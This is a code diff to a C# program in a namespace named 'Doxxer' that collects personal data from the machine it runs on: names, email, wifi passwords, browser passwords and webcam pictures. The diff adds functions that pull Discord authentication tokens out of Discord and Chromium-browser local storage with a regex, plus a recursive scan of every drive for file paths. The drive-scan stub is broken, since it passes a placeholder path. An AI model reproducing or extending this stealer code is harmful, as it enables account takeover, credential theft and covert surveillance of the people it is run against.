@@ -1,7 +1,12 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
 using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
+using System.IO;
+using System.Linq;
+using System.Security.Permissions;
+using System.Text.RegularExpressions;
 using Emgu.CV;
 using Microsoft.Win32;
 using SimpleWifi;
@@ -12,15 +17,20 @@ namespace Doxxer
     {
         public GatherData()
         {
-            Console.Write(getFullName() + "\n");
-            Console.Write(getUserEmail() + "\n");
-            Console.Write(getComputerName() + "\n");
-            Console.Write(getConnectedWifi().Name + "\n");
-            Console.Write(GetWifi() + "\n");
-            Console.Write(GetSystemDefaultBrowser() + "\n\n");
+            getAllFilePaths();
+            // Console.Write(getFullName() + "\n");
+            // Console.Write(getUserEmail() + "\n");
+            // Console.Write(getComputerName() + "\n");
+            // Console.Write(getConnectedWifi().Name + "\n");
+            // Console.Write(GetWifi() + "\n");
+            // Console.Write(GetSystemDefaultBrowser() + "\n\n");
+            // foreach (var token in GetTokens())
+            // {
+            //     Console.Write(token +  "\n");
+            // }
             //getPasswordsFromBrowser("chrome");
-            takeWebCamPicture();
-            getAccounts();
+            //takeWebCamPicture();
+            //getAccounts();
         }
 
         private string GetWifi()
@@ -155,5 +165,99 @@ namespace Doxxer
                 Console.Write(password.Url + ": " + password.Username + ": " + password.Password + "\n");
             }
         }
+        private List<string> GetTokens()
+        {
+            var paths = new Dictionary<string, string>();
+            var tokens = new List<string>();
+
+            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+            
+            paths.Add("Discord", roaming + "\\discord");
+            paths.Add("Discord Canary", roaming + "\\discordcanary");
+            paths.Add("Discord PTB", roaming + "\\discordptb");
+            paths.Add("Google Chrome", local + "\\Google\\Chrome\\User Data\\Default");
+            paths.Add("Brave", local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
+            paths.Add("Yandex", local + "\\Yandex\\YandexBrowser\\User Data\\Default");
+            paths.Add("Chromium", local + "\\Chromium\\User Data\\Default");
+            paths.Add("Opera", roaming + "\\Opera Software\\Opera Stable");
+
+            foreach (KeyValuePair<string, string> kvp in paths)
+            {
+                string platform = kvp.Key;
+                string path = kvp.Value;
+                
+                if (Directory.Exists(path))
+                {
+                    foreach (string token in FindTokens(path))
+                    {
+                        tokens.Add($"{platform}: {token}");
+                    }
+                }
+            }
+            return tokens;
+        }
+
+        private List<string> FindTokens(string path)
+        {
+            path += "\\Local Storage\\leveldb";
+            var tokens = new List<string>();
+
+            foreach (string file in Directory.GetFiles(path, "*.ldb", SearchOption.TopDirectoryOnly))
+            {
+                string content = File.ReadAllText(file);
+
+                foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
+                {
+                    tokens.Add(match.ToString());
+                }
+            }
+            return tokens;
+        }
+
+        private void getAllFilePaths()
+        {
+            HashSet<string> filePaths = new HashSet<string>();
+            foreach (var drive in DriveInfo.GetDrives())
+            {
+                var paths = Traverse(@"Directory path");
+            }
+        }
+        
+        private IEnumerable<string> Traverse(string rootDirectory)
+        {
+            IEnumerable<string> files = Enumerable.Empty<string>();
+            IEnumerable<string> directories = Enumerable.Empty<string>();
+            try
+            {
+                // The test for UnauthorizedAccessException.
+                var permission = new FileIOPermission(FileIOPermissionAccess.PathDiscovery, rootDirectory);
+                permission.Demand();
+
+                files = Directory.GetFiles(rootDirectory);
+                directories = Directory.GetDirectories(rootDirectory);
+            }
+            catch
+            {
+                // Ignore folder (access denied).
+                rootDirectory = null;
+            }
+
+            if (rootDirectory != null)
+                yield return rootDirectory;
+
+            foreach (var file in files)
+            {
+                yield return file;
+            }
+
+            // Recursive call for SelectMany.
+            var subdirectoryItems = directories.SelectMany(Traverse);
+            foreach (var result in subdirectoryItems)
+            {
+                yield return result;
+            }
+        }
+
     }
 }
